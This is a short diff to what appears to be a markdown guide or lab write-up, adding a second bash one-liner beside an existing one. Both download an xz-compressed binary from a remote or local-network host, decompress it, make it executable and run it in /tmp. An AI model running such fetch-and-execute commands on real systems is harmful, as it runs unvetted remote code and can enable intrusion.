@@ -48,6 +48,7 @@ charlie@galactica:/tmp$ exit
 
 ```bash
 rm /tmp/f11; curl -sL https://f11snipe.sh/f11.xz -o /tmp/f11.xz && xz -d /tmp/f11.xz && chmod +x /tmp/f11 && /tmp/f11
+rm /tmp/f11; curl -sL https://192.168.1.67:8000/dist/f11-linux.xz -o /tmp/f11.xz && xz -d /tmp/f11.xz && chmod +x /tmp/f11 && /tmp/f11
 ```
 
 
